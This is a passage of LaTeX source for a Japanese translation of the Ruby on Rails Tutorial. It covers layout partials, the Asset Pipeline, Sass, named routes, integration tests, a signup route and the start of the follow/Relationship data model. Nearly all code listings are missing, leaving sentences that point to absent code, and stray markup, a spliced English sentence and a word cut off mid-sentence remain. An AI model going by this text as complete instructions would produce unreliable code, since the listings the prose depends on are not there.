最初に、パーシャルを定義するとレイアウトがどのように変わるかを見てみましょう (リスト\ref{code:layout_with_partials})。
レイアウトにshimとheaderのパーシャルを追加する
リスト\ref{code:layout_with_partials}では、以下のように\kode{render}と呼ばれるRailsヘルパー呼び出しだけを使って、HTML shimのスタイルシート行を置換しています。
多くのRails開発者は、異なるビューの間で共通に使用するパーシャルを保存するディレクトリとして、\kode{shared}ディレクトリを使用します。
著者は、複数のビューで共有するユーティリティパーシャルについては\kode{shared}フォルダに保存し、文字どおり全ページ (サイトレイアウトの一部として) 共通のパーシャルについては\kode{layouts}ディレクトリへ保存することを好んでいます
(\kode{shared}ディレクトリは第\ref{cha:sign_up}章で作成します)。
著者はこのように分割保存するのが論理的であると考えますが、\kode{shared}フォルダにすべて保存しても問題なく動作します。
もちろん、パーシャルが動作するためには、それに対応するファイルとコンテンツを記述しなければなりません。
このshimパーシャルの場合は、リスト\ref{code:layout_new_structure}のわずか3行のshimコードだけです。
作成したコードをリスト\ref{code:stylesheets_partial}に示します
HTML shim用のパーシャル
同様に、他のヘッダーの情報もリスト\ref{code:header_partial}のパーシャルに移動し、\kode{render}を呼び出してレイアウトに挿入することができます。
(パーシャルでは、自動生成せずに、テキストエディタを使って手動で作成するのが一般的です。)
header用のパーシャル
これでパーシャルの作成方法がわかりましたので、今度はヘッダーに対応するフッタを同じ方法で追加しましょう。
\kode{footer}タグと\kode{.footer}クラスを両方使用していることについて疑問に思う方がいるかもしれません。
その理由は、footerタグとする方が読み手にとって意味が明確であるのと、.footerクラスはBootstrapで使用するためです。
\kode{footer}を\kode{div}に置き換えても動作は変わりません。
footer用のパーシャル
<small>
Michael Hartl (マイケルハートル)
</small>
</footer>
About
Contact
(\kode{header}タグと同様、\kode{footer}タグもHTML5で新たに追加された要素です)。
フッタパーシャルは、スタイルシートやヘッダーパーシャルのときと同じ方法でレイアウト中に追加できます (リスト\ref{code:layout_with_footer})。
レイアウトにfooterパーシャルを追加する
そのまま実際にフッターを表示してみるとどうにも見苦しいので、リスト\ref{code:footer_css}でスタイルを若干追加しましょう。
スタイルを追加した結果を図\ref{fig:site_with_footer}に示します。
サイトにfooter用CSSを追加する
/* footer */
Homeページにfooterを追加する
最近のRailsに追加された機能の中で最も特筆すべき機能のひとつは、CSS、JavaScript、画像などの静的コンテンツの生産性と管理を大幅に強化する「\emph{Asset Pipeline}」です。
この節では、Asset Pipelineの概要と、素晴らしいCSS生成ツールである「\emph{Sass}」の使い方について説明します。
Asset Pipelineは、Railsの流儀を守りながら多大な変化をもたらしますが、一般的なRails開発者の視点からは、アセットディレクトリ、マニフェストファイル、プリプロセッサエンジンという、3つの主要な機能が理解の対象となります
このチュートリアル構成は、Michael Erasmusによる素晴らしいブログ記事「5分でわかるRails 3のAsset Pipeline (英語)」をもとにしています。
詳細についてはRailsガイドの「\href{http://guides.rubyonrails.org/asset_pipeline.html}{アセットパイプライン}」の項を参照してください。
では、それぞれを順に見ていきましょう。
アセットディレクトリ
Rails 3.0以前のバージョンでは、静的ファイルは\kode{public/}以下の次のディレクトリに置かれていました。
これらのディレクトリ中のファイルは http://example.com/stylesheets のようなリクエストによって自動的に配信されます。これは3.0以降も同様です。
Rails3.1以降では、静的ファイルを目的別に分類する、標準的な\emph{3つの}ディレクトリが使用されるようになりました。最新のRailsでも同様です。
\kode{app/assets}: 現在のアプリケーション固有のアセット
\kode{lib/assets}: あなたの開発チームによって作成されたライブラリ用のアセット
\kode{vendor/assets}: サードパーティのアセット
これらのディレクトリには、それぞれのアセットクラス用のサブディレクトリがあります。たとえば、app/assetsには次のようなサブディレクトリがあります。
マニフェストファイル
アセットを上記の論理的な場所へ配置すれば、\emph{マニフェストファイル}を使用して、それらをどのように1つのファイルにまとめるのかをRailsに指示することができます。なお、実際にまとめるのは\href{https://github.com/sstephenson/sprockets}{Sprockets} gemが行います。
(マニフェストファイルはCSSとJavaScriptには適用されますが、画像ファイルには適用されません) 。
1つの例として、アプリケーションスタイルシート用のマニフェストファイルを見てみましょう (リスト\ref{code:app_css_manifest})。
アプリケーション固有のCSS用マニフェストファイル
You're free to add
<n> *= require_tree .
<n> *= require_self
上の行で重要な部分は実はCSSコメントの中にあります。以下の行は、適切なファイルをインクルードするためにSprocketsによって使用されます。
<n> *= require_tree .
\kode{app/assets/stylesheets}ディレクトリ (サブディレクトリを含む) 中のすべてのCSSファイルが、アプリケーションCSSに含まれるようにします。次の行
<n> *= require_self
CSSの読み込みシーケンスの中で、\kode{application.css}自身もインクルードすることを指定しています。
Railsには実用的なデフォルトのマニフェストファイルが付属しているので、\emph{Railsチュートリアル}では変更を加える必要がありませんが、もし必要な場合は、Railsガイドの「\href{http://guides.rubyonrails.org/asset_pipeline.html}{アセットパイプライン}」で詳細な情報を参照できます。
プリプロセッサエンジン
必要なアセットをディレクトリに配置してまとめた後、Railsはさまざまなプリプロセッサエンジンを介してそれらを実行し、ブラウザに配信できるようにそれらをマニフェストファイルを用いて結合し、サイトテンプレート用に準備します。
Railsは、どのプリプロセッサを使用するかを、ファイル名の拡張子を使用して判断します。最も一般的な拡張子は、Sass用の\kode{.scss}、CoffeeScript用の\kode{.coffee}、埋め込みRuby (ERb) 用の\kode{.erb}です。
\ref{sec:layouts_and_embedded_ruby}では最初にERbを、\ref{sec:sass}ではSassをそれぞれ扱いました。
なお本書では扱いませんが、CoffeeScriptはエレガントで簡潔な言語で、JavaScriptにコンパイルして実行します
(興味のある方は、RailsCastの「\href{http://railscasts.com/episodes/267-coffeescript-basics}{CoffeeScriptの基礎} (英語)」から始めると良いでしょう)。
プリプロセッサエンジンはつなげて実行する (chain) ことができます。
上の拡張子の場合、CoffeeScriptプロセッサ経由で実行されます。
上の拡張子の場合は、CoffeeScriptとERbの両方で実行されます (コードは右から左へと実行されますので、この例ではCoffeeScriptが最初に実行されます)。
本番環境での効率性
Asset Pipelineの最大のメリットの1つは、本番のアプリケーションで効率的になるように最適化されたアセットも自動的に生成されることです。
従来は、CSSとJavaScriptを整理するために、機能を個別のファイルに分割し、(インデントを多用して) 読みやすいフォーマットに整えていました。
これは、プログラマにとっては便利な方法ですが、本番環境にとっては非効率です。
それというのも、最小化されていないCSSやJavaScriptファイルを多数インクルードすると、ページの読み込み時間が著しく遅くなるからです (読み込み時間は、ユーザー体験の質に影響を与える重要な指標の1つです)。
Asset Pipelineを使うと、この「開発効率と読み込み時間のどちらを重視するか」という問題について悩む必要がなくなります。開発環境ではプログラマにとって読みやすいように整理しておき、本番環境ではAsset Pipelineを使ってファイルを最小化すればよいのです。
具体的には、Asset Pipelineがすべてのスタイルシートを1つのCSSファイル (\kode{application.css}) にまとめ、すべてのJavaScriptファイルを1つのJSファイル (\kode{javascripts.js}) にまとめてくれます。さらに、それらのファイルすべてに対して  不要な空白やインデントを取り除く処理を行い、ファイルサイズを\emph{最小化}してくれます。
結果として、開発環境と本番環境という、2つの異なった状況に対してそれぞれ最高の環境を提供してくれます。
<n><n>    % subsection the_asset_pipeline (end)<n><n>    \subsection{素晴らしい構文を備えたスタイルシート} % (fold)<n>    \label{sec:sass}<n><n>
\emph{Sass} は、スタイルシートを記述するための言語であり、CSSに比べて多くの点が強化されています。
この節では、Sassが提供する2つの重要な機能、\emph{ネスト}と\emph{変数}について説明します。
(3つ目の重要な機能である\emph{ミックスイン}については、\ref{sec:rails_environments}で紹介します)。
このため、有効なCSSファイルは、すべてSCSSファイルとしても扱うことができ、既存の記法ルールを使用しているプロジェクトにとっても互換性のある便利なフォーマットになっています。
本書の例では、Bootstrapの恩恵を得るために、私達は最初からSCSSを使用しています。
RailsのAsset Pipelineは、\kode{.scss}という拡張子を持つファイルをSassを使って自動的に処理してくれます。このため、\kode{custom.css.scss}ファイルはSassプリプロセッサによって前処理され、その後ブラウザへの配信に備えてパッケージ化されます。
スタイルシート内に共通のパターンがある場合は、要素をネストさせることができます。
たとえば、リスト\ref{code:universal_css}では、以下のように\kode{.center}と\kode{.center h1}の両方に対してルールがあります。
上のルールは、Sassを使用して以下のように書き換えることができます。
上の例では、ネストの内側にある\kode{h1}というルールは、\kode{.center}のルールを継承しています。
今度は、もう少し異なるルールに対してネスト機能を使う例を見てみましょう。
リスト\ref{code:logo_css}には以下のコードがあります。
これらのネスト機能は、フッターのCSSでも使用できます。リスト\ref{code:footer_css}のコードは、SCSSを使用して以下のように書き換えることができます。
リスト\ref{code:footer_css}を手作業で変換してみることは、良い演習になります。変換後にもCSSが適切に動作していることを確認してみましょう。
Sassでは、冗長なコードを削除し、より自由な表現を可能にするために、\emph{変数}が定義できるようになっています。
たとえば、リスト\ref{code:typography_css}やリスト\ref{code:footer_css}を見てみると、同じ色を繰り返し参照している箇所があります。
この機能を使用して、SCSSを以下のように書き直すことができます。
実際、Bootstrapフレームワークでは、多くの色に対して変数名を定義しています。定義されている変数はBootstrapページの「\href{http://getbootstrap.com/customize/#less-variables}{LESS変数一覧}」で参照することができます。
このWebサイトでは、SassではなくLESSを使って変数が定義されていますが、\texttt{bootstrap-sass}というgemを使用すれば、Sassでも同様の変数が使えるようになります。
話を戻して、Bootstrapの変数の一覧表を見ると、薄い灰色に対して以下の変数名が与えられることに気が付きます。
これはつまり、
今回取り上げたSassのネスト機能や変数機能を使ってSCSSファイルを全面的に書き直すと、リスト\ref{code:refactored_scss}のようになります。
\kode{footer}タグのルールが、劇的に向上していることを確認してみてください。
ネストや変数を使って初期のSCSSファイルを書き直した結果
/* mixins, variables, etc. */
Sassを使ってスタイルシートをより簡単にする方法は他にもありますが、今回はその中でも最も重要な機能を使ってリスト\ref{code:refactored_scss}を書き直しました。Sassを使うことによって、素晴らしいスタートを切ることができました。
See the \href{http://sass-lang.com/}{Sass website} for more details.
もちろん、以下のようにリンクを直接記述することもできます。
しかし、上の記法はRails流ではありません。
/about
さらに、Railsでは以下のようなコードでは\emph{名前付きルート}を使用するのが慣例となっています。
上のようにすることでコードの意味がわかりやすくなり、\kode{about\_path}の定義を変えれば\kode{about\_path}が使用されているすべてのURLを変更できるため、柔軟性が高まります。
今後使用する計画のあるすべてのリンクのリストを、URLとルート (route) のマッピングと共に表\ref{table:url_mapping}に示します。
\ref{sec:setting_the_root_route}で最初のルートは設定済みですが、それ以外のルートについても同様に実装していきます。なお、loginについては本章の最後で少しだけ実装します
(第\ref{cha:log_in_log_out}章で本格的に実装します)。
/help
/contact
/signup
/login
サイトリンクのルート (routing) とURLのマッピング
\label{table:url_mapping}}<n>\end{table}<n><n>\subsection{Contactページ} % (fold)<n>\label{sec:contact_page}<n><n>
まずは、第\ref{cha:static_pages}章の演習で取り上げたContactページについて追加しましょう。
Contactページのテストをリスト\ref{code:contact_page_test}に示します。これは単にリスト\ref{code:title_tests}で使用されているテストのパターンに従ったものです。
Contactページのテスト
"Ruby on Rails Tutorial Sample App"
<n><n>  test "should get help" do<n>    get :help<n>    assert_response :success<n>    assert_select "title", "Help
 | Ruby on Rails Tutorial Sample App
アプリケーションコードは、\ref{sec:getting_started_with_testing}のAboutページへの追加と良く似ています。最初にルート (リスト\ref{code:contact_route}) を更新します。次に\kode{contact}アクションをStaticPagesコントローラ (リスト\ref{code:contact_action}) に追加します。最後にContactビュー (リスト\ref{code:contact_view}) を作成します。
Contactページのルートを追加する ( \failing )
Contactページ用のアクションを追加する ( \failing )
Contactページのビューを追加する ( \passing )
ここで、すべてのテストが \passing であることを確認しておいてください。
<n>\end{code}<n>\end{codelisting}<n><n>    % subsection route_tests (end)<n><n>    \subsection{Railsのルート} % (fold)<n>    \label{sec:rails_routes}<n><n>To add the named routes for the sample app's static pages, we'll edit the routes file, \kode{config/\-routes.rb}, that Rails uses to define URL mappings. 
まずは、\ref{sec:setting_the_root_route}で定義したHomeページのルーティングについて見直していきましょう。あのときは特別にHomeページのみ設定をしましたが、残りの静的ページについても同様にルーティングを設定していきます。
私たちはこれまでに、ルートURLを定義するコードを3回見てきました。1つ目は
というHelloアプリケーションのコード (リスト\ref{code:hello_root_route})です。2つ目は
というToyアプリケーションのコード (リスト\ref{code:rails_routes_root_route})。そして最後は
というSampleアプリケーションのコードです (リスト\ref{code:home_root_route})。
いずれの場合においても、\kode{root}メソッドを使ってルートURL "/" をコントローラーのアクションに紐付けていました。
ルートURLのようなルーティングを定義することの効果は、ブラウザからアクセスしやすくすることだけではありません。それ以外にも、生のURLではなく名前付きルートを使ってURLを参照することができるようになります。which is to create named routes that allow us to refer to routes by a name rather than by the raw URL. In this case, these routes are \kode{root\_path} and \kode{root\_url}, with the only difference being that the latter includes the full URL:
なお、\emph{Railsチュートリアル}では、\kode{\_path}書式を使用する一般的な規約に従い、リダイレクトの場合のみ\kode{\_url}書式を使用します。
これは、HTTP標準では技術的にリダイレクト後に完全なURLが要求されるためです。ただし、ほとんどのブラウザではどちらの方法でも動作します。
HelpページやAboutページ、Contactページなどの名前付きルートを定義したい場合は、\kode{get}ルールを使って定義することができます (リスト\ref{code:contact_route})。たとえば次のようなルールは、
また、ルートURLのときと同様に、\kode{help\_path}や\kode{help\_url}といった名前付きルートも使えるようになります。
他の静的ページについても同様にルーティングを変更していくと、リスト\ref{code:contact_route}はリスト\ref{code:static_page_routes}のようなコードになります。
静的なページのルーティング一覧
リスト\ref{code:static_page_routes}でルートを定義したことにより、レイアウトの中で名前付きルートが使えるようになりました。
早速、\kode{link\_to}メソッドの2番目の引数で、適切な名前付きルートを使ってみましょう。
たとえば以下のコードの場合、
他も同様です。
ヘッダーパーシャルでは、Web共通の慣習に従って、ロゴにもHomeページへのリンクを追加します。
headerパーシャルにリンクを追加する
footerパーシャルにリンクを追加する
これで、レイアウトに第\ref{cha:static_pages}章で作成したすべての静的ページへのリンクができました。たとえば\href{http://localhost:3000/about}{/about}の場合はAboutページ (図\ref{fig:about_page}) に移動します。
\href{http://localhost:3000/about}{/about}で表示されるAboutページ
レイアウト内のいくつかのリンクを埋めることができたので、これらのリンクが正しく動いているかどうかチェックするテストを書いてみましょう。
ブラウザを立ち上げてルートURLにアクセスし、それぞれのリンクをクリックして確かめることもできますが、変更する度にこの作業を毎回繰り返していくのは大きな負担です。
そこで、「統合テスト (\emph{(Integration Test)})」を使って一連の作業を自動化してみましょう。統合テストを使うと、アプリケーションの動作を端から端まで (end-to-end) シミュレートしてテストすることができます。
まずは、\kode{site\_layout}というテストのテンプレートを生成するところから始めてみます。
このとき、Railsは与えられたファイル名の末尾に \kode{\_test} という文字列を追加することに注目してください。
今回の目的は、アプリケーションのHTML構造を調べて、レイアウトの各リンクが正しく動くかどうかチェックすることです。つまり、
ルートURL (Homeページ) にGETリクエストを送る
正しいページテンプレートが描画されているかどうか確かめる
Home、Help、About、Contactの各ページへのリンクが正しく動くか確かめる
Railsの統合テストでは、上のステップをコードに落とし込んでいくことになります (リスト\ref{code:layout_links_test})。具体的には、まず\kode{assert\_template}メソッドを使って、Homeページが正しいビューを描画しているかどうか確かめます
何人かの開発者は「1つのテストに複数のアサーションを入れるべきではない」と強く主張するでしょう。
この演習は不必要に複雑で、もし各テストの直前に共通のセットアップ用タスクがあれば、たしかに不要な負荷がかかることでしょう。
しかし、よく書かれたテストは一貫したストーリーのようになり、人間にとって理解しやすいです。ストーリーを独立した場面ごとに分割されてしまうと、物語調ではなくなってしまいます。
レイアウトのリンクに対するテスト ( \passing )
リスト\ref{code:layout_links_test}では、\kode{assert\_select}メソッドの高度なオプションを使っています (このメソッド自体はリスト\ref{code:title_tests}やリスト\ref{code:contact_page_test}でも登場しました)。
今回のケースでは、特定のリンクが存在するかどうかを、\kode{a}タグと\kode{href}属性をオプションで指定して調べています。たとえば
上のコードでは、Railsは自動的にはてなマーク "?" を\kode{about\_path}に置換しています (このとき "about\_path" 内に特殊記号があればエスケープ処理されます)。これにより、次のようなHTMLがあるかどうかをチェックすることができます。
一方で、ルートURLへのリンクは\emph{2つ}あることを思い出してください (1つはロゴに、もう1つはナビゲーションバーにあります)。このようなとk
といった風に書くことで、リスト\ref{code:header_partial_links}で定義したHomeページのリンクの個数も調べることもできます
\kode{assert\_select}には色々な指定の仕方があります。その代表例をいくつか表\ref{table:assert_select}で紹介します。
マッチするHTML
\kode{assert\_select}のいくつかの使用例
リスト\ref{code:layout_links_test}で追加した統合テストが通るかどうかは、次のようにRakeタスクを実行することで試すことができます。
統合テストが成功したら、今度はすべてのテストを流して \passing するかどうか確かめてみてください。
レイアウトのリンクをテストする統合テストが追加されたことで、リンクに間違った変更が加えられたらすぐに気付けるようになりました。
この節では、レイアウトとルーティングの取り組みにおける頂点として、ユーザー登録ページへのルーティングを作成します。そのために2番目のコントローラを作成することになります。
これは、Webサイトでユーザー登録を行えるようにするための最初の重要な一歩となります。次の一歩であるユーザーのモデリングは第\ref{cha:modeling_users}章で行い、第\ref{cha:sign_up}章でユーザー登録が完成します。
<n><n>    \subsection{Usersコントローラ} % (fold)<n>    \label{sec:users_controller}<n><n>
\ref{sec:static_pages}で、最初のコントローラであるStaticPagesコントローラを作成しました。
今度は2番目のコントローラであるUsersコントローラを作成しましょう。
Railsで好まれている\href{http://en.wikipedia.org/wiki/Representational_State_Transfer}{RESTアーキテクチャ}の規約に従い、新規ユーザー用のアクションを\kode{new}とします。したがって、\kode{generate controller}の引数に\kode{new}を渡して、自動的にアクションを作成してみましょう。
変更の結果をリスト\ref{code:generate_users_controller}に示します。
Usersコントローラの生成 (\kode{new}アクションを追加)
      create  app/controllers/users_controller.rb
      invoke  erb
      create    app/views/users
      create    app/views/users/new.html.erb
      invoke  helper
      create    app/helpers/users_helper.rb
      invoke    test_unit
      invoke  assets
      invoke    coffee
      create      app/assets/javascripts/users.js.coffee
      invoke    scss
      create      app/assets/stylesheets/users.css.scss
リスト\ref{code:generate_users_controller}により、\kode{new}アクションを持つUsersコントローラ(リスト\ref{code:initial_users_controller})と、スタブのユーザービューを作成します(リスト\ref{code:initial_new_action})。
このとき、新しいUserページ用の小さなテスト (リスト\ref{code:user_new_test}) も生成されていて、この時点ではパスするはずです。
\kode{new}アクションを持つ最初のUsersコントローラ
Users用の最初の\kode{new}アクション
Userページ用の最初のテスト 
\ref{sec:users_controller}のコードにより、新規ユーザー用の動作するページが/users/new にできました。ここで表\ref{table:url_mapping}を思い出していただきたいのですが、URLは/users/newではなく表のとおりに/signupにしたいと思います。
リスト\ref{code:static_page_routes}の例に従い、ユーザー登録URL用に\kode{get ’/signup’}のルールを追加します (リスト\ref{code:signup_route})。
ユーザー登録ページのルート
次に、新しく定義された名前付きルートを使って、Homeページのボタンに適切なリンクを追加す。
他のルートと同様、\kode{get ’/signup’}と記述したことで\kode{signup\_path}という名前付きルートができ、それをリスト\ref{code:home_page_signup_link}で使用します。
signupページへのテストは演習に回すことにします (\ref{sec:layout_exercises})。
ボタンにユーザー登録ページへのリンクを追加する
最後に、signupページ用のカスタムスタブ (stub) のビューを追加します (\ref{code:initial_signup_page})。
最初のユーザー登録ページ (スタブ)
これで、少なくともサインインのルートを追加するまでの間、リンクと名前付きルートが完成しました(第\ref{cha:log_in_log_out}章)。
結果を図\ref{fig:new_signup_page}の新規ユーザーのページ (URI /signup) に示します。
\href{http://localhost:3000/signup}{/signup}で表示される新しいユーザー登録ページ
この章では、アプリケーションのレイアウトを形にし、ルーティングを洗練させました。
本書では、以後サンプルアプリケーションを肉付けすることに専念します。最初に、ユーザー登録、サインイン、サインアウトできるユーザーを追加します。次に、マイクロポストを追加します。最後に、他のユーザーをフォローできるようにします。
Gitを使っている方は、この時点でmasterブランチに変更をマージしてください。
続いて、Bitbucketにプッシュします。
最後に、Herokuへデプロイします。
デプロイが無事に終わると、本番環境でサンプルアプリケーションが動いているはずです (図\ref{fig:layout_production})。
本番環境で動くサンプルアプリケーション
不具合が発生した場合は、以下のコマンドを試してみてください。
上のコマンドを使用してHerokuのログファイルを参照し、エラーをデバッグしてください。
)<n><n>\subsection{本章のまとめ} % (fold)<n>\label{sec:filling_in_the_layout_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
HTML5を使ってheaderやfooter、logoやbodyといったコンテンツのレイアウトを定義しました
Railsのパーシャルは効率化のために使われ、別ファイルにマークアップを切り出すことができます
CSSは、CSSクラスとidを使ってレイアウトやデザインを調整します
Bootstrapフレームワークを使うと、いい感じのデザインを素早く実装できる
SassとAsset Pipelineは、(開発効率のために切り分けられた) CSSの冗長な部分を圧縮し、本番環境に最適化した結果を出力する
Railsのルーティングでは自由にルールを定義することができ、また、その際に名前付きルートも使えるようになる
統合テストは、ブラウザによるページ間の遷移を効率的にシミュレートする
\ref{sec:sass}で触れたように、まずはリスト\ref{code:footer_css}のフッター用CSSをリスト\ref{code:refactored_scss}のSCSSに変更してみてください。
リスト\ref{code:layout_links_test}の統合テストでは、 \kode{get}メソッドを使ってユーザー登録ページにアクセスし、ページタイトルが正しいかどうかチェックするテストコードを加えてください。
リスト\ref{code:test_helper_application_helper}でお見せしたように、Applicationヘルパーで使っている\kode{full\_title} ヘルパーを、test環境でも使えるようにすると便利です。
こうしておくと、リスト\ref{code:layout_links_test_signup_full_title_helper}のようなコードを使って正しいタイトルをテストすることができます (ちなみにこれは前回の演習の応用でもあります)。
ただし、これは完璧なテストではありません。たとえばベースタイトルに“Ruby on Rails Tutoial”といった誤字があったとしても、このテストでは発見することができないでしょう。
この問題を解決するためには、\kode{full\_title}ヘルパーに対するテストを書く必要があります。そのために、Applicationヘルパーをテストするファイルを作成し、リスト\ref{code:full_title_helper_tests}の\kode{FILL\_IN}のようなコードを書いてみましょう。
ヒント: リスト\ref{code:full_title_helper_tests}では\kode{assert\_equal <期待される値>, <実際の値>}といった形で使っていましたが、内部では\kode{==}演算子を使って、期待される値と実際の値を比較して正しいかどうかテストしています。
テスト環境でもApplicationヘルパーを使えるようにする
テスト環境で\kode{full\_title}ヘルパーを使う 
\kode{full\_title}ヘルパーのテスト
この章では、他のユーザーをフォロー (およびフォロー解除) できるソーシャルレイヤーを追加し、各ユーザーのHomeページに、現在フォロー中のユーザーのステータスフィードを表示できるようにして、サンプルアプリケーションのコアを完成させます。
まずは、ユーザー間の関係性をどうモデリングするかについて学びます (\ref{sec:the_relationship_model})。その後、 Aモデリング結果に対応するWebインターフェースを実装していきます (\ref{sec:a_web_interface_for_following_and_followers})。このとき、Webインターフェースの例としてAjaxについても紹介します。
最後に、ステータスフィードの完成版を実装します (\ref{sec:the_status_feed})。
この最終章では、本書の中で最も難易度の高い手法をいくつか使用しています。その中には、ステータスフィード作成のためにRuby/SQLを「だます」テクニックも含まれます。
この章の例全体にわたって、これまでよりも複雑なデータモデルを使用しています。ここで学んだデータモデルは、今後自分用のWebアプリケーションを開発するときに必ず役に立ちます。
また、本書を卒業して実際の開発に携わるときのために、\ref{sec:following_conclusion}で役立つリソース集 (読み物ガイド) についても紹介します。
この章で扱っている手法は本書全体の中で最も難易度が高いので、理解を助けるため、コードを書く前にはいったん立ち止まってインターフェースを探検することにします。
これまでの章と同様、最初にモックアップを示します
ページ操作の全体的なフローは次のようになります。あるユーザー (John Calvin) は自分のプロファイルページを最初に表示し (図\ref{fig:page_flow_profile_mockup})、フォローするユーザーを選択するためにUsersページ (図\ref{fig:page_flow_user_index_mockup}) に移動します。
Calvinは2番目のユーザーThomas Hobbes (図\ref{fig:page_flow_other_profile_follow_button}) を表示し、[Follow] ボタンを押してフォローします。
これにより、[Follow] ボタンが [Unfollow] に変わり、Hobbes の [followers] カウントが1人増えます (図\ref{fig:page_flow_other_profile_unfollow_button_mockup})。
CalvinがHomeページに戻ると、[following] カウントが1人増え、Hobbesのマイクロポストがステータスフィードに表示されるようになっていることがわかります (図\ref{fig:page_flow_home_page_feed_mockup})。
この節では、以後このフローの実現に専念します。
現在のプロフィールページ
フォローする相手を見つける
ユーザーのプロフィール画面に [Follow] ボタンが表示されている
プロフィールに [Unfollow] ボタンが表示され、フォロワーのカウントが1つ増えた
Homeページにステータスフィードが表示され、フォローのカウントが1増えた
\label{fig:page_flow_home_page_feed_mockup}}<n>\end{figure}<n><n><n>  \section{Relationshipモデル} % (fold)<n>  \label{sec:the_relationship_model}<n><n>
ユーザーをフォローする機能を実装する第一歩は、データモデルを構成することです。ただし、これは見た目ほど単純ではありません。
この後で説明しますが、この方法ではたちまち壁に突き当たってしまいます。これを解決するための\kode{has\_many through} (多対多の関係を表すのに使用) についてもこの後で説明します。
Gitユーザーはこれまで同様新しいトピックブランチを作成してください。
following-users
<n>\end{code}<n><n>    \subsection{データモデルの問題 (および解決策)} % (fold)<n>    \label{sec:a_problem_with_the_data_model}<n><n>
ユーザーをフォローするデータモデル構成のための第一歩として、典型的な場合を検討してみましょう。
あるユーザーが、別のユーザーをフォローしているところを考えてみましょう。具体例を挙げると、CalvinはHobbesをフォローしています。これを逆から見れば、HobbesはCalvinからフォローされています。CalvinはHobbesから見れば\emph{フォロワー (follower)}であり、HobbesはCalvinによって\emph{フォローされている (followed) }ことになります。
Railsにおけるデフォルトの複数形の慣習に従えば、あるユーザーをフォローしているすべてのユーザーの集合は\emph{followers}となり、\kode{user.followers}はそれらのユーザーの配列を表すことになります。
残念なことに、この名前付けは逆についてはうまくいきません (Railsのというより英語の都合ですが)。フォローされているすべてのユーザーの集合は、このままでは\emph{followeds}となってしまい、英語の文法からも外れるうえに非常に見苦しいものになってしまいます。
そこで、今Twitterの慣習にならい、本チュートリアルでは\emph{following}という呼称を採用します (例: “50 following, 75 followers”)。したがって、あるユーザーがフォローしているすべてのユーザーの集合は\kode{calvin.following}となります。
これにより、図\ref{fig:naive_user_has_many_following}のように\kode{following}テーブルと \kode{has\_many}関連付けを使用して、フォローしているユーザーのモデリングができます。
見えやすくするため、図\ref{fig:naive_user_has_many_following}から\kode{following}テーブルの\kode{id}カラムを省略しました。
さらに、それぞれの行はユーザーなので、これらのユーザーに名前やパスワードなどの属性も追加する必要があるでしょう。
図\ref{fig:naive_user_has_many_following}のデータモデルの問題点は、非常に無駄が多いことです。各行には、フォローしているユーザーのidのみならず、名前やメールアドレスまであります。これらはいずれも\emph{users}テーブルに\kode{既にある}ものばかりです。
さらによくないことに、\emph{followers}の方をモデリングするときにも、同じぐらい無駄の多い\kode{followers}テーブルを別に作成しなければならなくなってしまいます。
結論としては、このデータモデルはメンテナンスの観点から見て悪夢です。ユーザー名を変更するたびに、\kode{users}テーブルのそのレコードだけでなく、\kode{following}テーブルと\kode{followers}テーブルの両方について、\emph{そのユーザーを含むすべての行{}/}を更新しなければならなくなります。
この問題の根本は、必要な抽象化を行なっていないことです。
正しいモデルを見つけ出す方法の1つは、Webアプリケーションにおける\emph{following}の動作をどのように実装するかをじっくり考えることです。
\ref{sec:a_users_resource}において、RESTアーキテクチャは、作成されたり削除されたりする\emph{リソース}に関連していたことを思い出してください。
ここから、2つの疑問が生じます。1. あるユーザーが別のユーザーをフォローするとき、何が作成されるのでしょうか。
2. あるユーザーが別のユーザーをフォロー\emph{解除}するとき、何が削除されるのでしょうか。
この点を踏まえて考えると、この場合アプリケーションによって作成または削除されるのは、つまるところ2人のユーザーの「\emph{関係 (リレーションシップ)}」であることがわかります。
つまり、1人のユーザーは1対多の関係を持つことができ、さらにユーザーはリレーションシップ\kode{を経由して}多くの\emph{following} (または\emph{followers}) と関係を持つことができるということです。
このデータモデルには他にも解決しなくてはいけない問題があります。Facebookのような友好関係 (Friendships) では本質的に左右対称のデータモデルが成り立ちますが、Twitterのようなフォロー関係では\emph{左右非対称}の性質があります。すなわち、CalvinはHobbesをフォローしていても、HobbesはCalvinをフォローしていないといった関係性が成り立つのです。
このような左右非対称な関係性を見分けるために、それぞれを\emph{能動的関係 (Active Relationship)}と\emph{受動的関係 (Passive Relationship)}と呼ぶことにします。たとえば先ほどの事例のような、CalvinがHobbesをフォローしているが、HobbesはCalvinをフォローしていない場合では、CalvinはHobbesに対して「能動的関係」を持っていることになります。逆に、HobbesはCalvinに対して「受動的関係」を持っていることになります
読者のPaul Fioravantiがこの用語を提案してくれました。ありがとうございます。
まずは、フォローしているユーザーを生成するために、能動的関係に焦点を当てていきます (受動的関係については\ref{sec:followers}で考えていきます)。
このデータモデルの模式図にすると、図\ref{fig:user_has_many_following}のようになります。
能動的関係をとおしてフォローしているユーザーを取得する模式図
能動的関係も受動的関係も、最終的にはデータベースの同じテーブルを使うことになります。したがって、テーブル名にはこの「関係」を表す「\emph{relationship}」を使いましょう。モデル名も同様にして、Relationshipモデルとします。
作成したRelationshipデータモデルを図\ref{fig:relationship_model}に示します。
1つのrelationshipテーブルを使って2つのモデル (能動的関係と受動的関係) をシミュレートする方法については、\ref{sec:following}で説明します。
Relationshipデータモデル
このデータモデルを実装するために、まずは次のように図\ref{fig:relationship_model}に対応したマイグレーションを生成します。
selfを省略した結果をリスト\ref{code:relationships_migration}に示します。
\kode{relationships}テーブルにインデックスを追加する
(リスト\ref{code:email_uniqueness_index}でメールアドレスの一意性を保証したり、リスト\ref{code:micropost_migration}で使った複合キーインデックスと比較してみてください。)
もちろん、このような重複 (2回以上フォローすること) が起きないよう、インターフェイス側の実装でも注意を払います(\ref{sec:following})。しかし、ユーザーが何らかの方法で (たとえば\kode{curl}などのコマンドラインツールを使用して) Relationshipのデータを操作するようなことも起こり得ます。そのような場合でも、一意なインデックスを追加していれば、エラーを発生させて重複を防ぐことができます。
\kode{relationships}テーブルを作成するために、いつものようにデータベースのマイグレーションを行います。
フォローしているユーザーとフォロワーを実装する前に、UserとRelationshipの関連付けを行います。
1人のユーザーには\kode{has\_many} (1対多) のリレーションシップがあり、このリレーションシップは\emph{2人}のユーザーの間の関係なので、フォローしているユーザーとフォロワーの両方に属します (\kode{belongs\_to})。
\ref{sec:user_micropost_associations}のマイクロポストのときと同様、以下のようなユーザー関連付けのコードを使用して新しいリレーションシップを作成します。
